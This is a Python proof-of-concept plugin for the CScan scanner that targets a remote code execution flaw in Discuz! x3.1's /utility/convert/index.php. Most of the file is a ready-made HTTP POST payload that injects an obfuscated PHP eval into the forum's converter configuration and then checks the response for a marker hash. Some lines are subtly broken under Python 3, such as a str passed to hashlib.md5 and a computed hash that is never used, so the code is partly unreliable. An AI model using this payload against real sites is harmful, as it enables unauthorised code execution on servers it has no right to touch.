# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import random
import hashlib


class Vuln(ABVuln):
    vuln_id = 'Discuz_0029'  # 平台漏洞编号，留空
    name = 'Discuz! x3.1 /utility/convert/index.php 代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-12-25'  # 漏洞公布时间
    desc = '''
        Discuz! x3.1 /utility/convert/index.php 代码执行漏洞
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-62557'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '3.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5c048182-5830-49c4-bb94-099f436d5416'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            random_str = str(random.random())
            random_md5 = hashlib.md5(random_str).hexdigest()
            paths = ['/', '/utility/']
            payload = ('a=config&source=d7.2_x2.0&submit=yes&newconfig%5Btarget%5D%5Bdbhost%5D=localhost&newconfig'
                       '%5Baaa%0D%0A%0D%0Aeval%28CHR(100).CHR(105).CHR(101).CHR(40).CHR(109).CHR(100).CHR(53).CHR(40).'
                       'CHR(51).CHR(49).CHR(52).CHR(49).CHR(53).CHR(57).CHR(50).CHR(54).CHR(49).CHR(51).CHR(41).CHR(41)'
                       '%29%3B%2F%2F%5D=localhost&newconfig%5Bsource%5D%5Bdbuser%5D=root&newconfig%5Bsource%5D%5Bdbpw%5D='
                       '&newconfig%5Bsource%5D%5Bdbname%5D=discuz&newconfig%5Bsource%5D%5Btablepre%5D=cdb_&newconfig%5B'
                       'source%5D%5Bdbcharset%5D=&newconfig%5Bsource%5D%5Bpconnect%5D=1&newconfig%5Btarget%5D%5Bdbhost%5D='
                       'localhost&newconfig%5Btarget%5D%5Bdbuser%5D=root&newconfig%5Btarget%5D%5Bdbpw%5D=&newconfig%5Btarget'
                       '%5D%5Bdbname%5D=discuzx&newconfig%5Btarget%5D%5Btablepre%5D=pre_&newconfig%5Btarget%5D%5Bdbcharset%5D='
                       '&newconfig%5Btarget%5D%5Bpconnect%5D=1&submit=%B1%A3%B4%E6%B7%FE%CE%F1%C6%F7%C9%E8%D6%C3')
            for path in paths:
                url = '{target}'.format(target=self.target)
                request = urllib.request.Request(
                    url+path+'convert/index.php', payload)
                content = str(urllib.request.urlopen(request).read())
                if '86539a15c11e3da6c205fd7b56928135' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
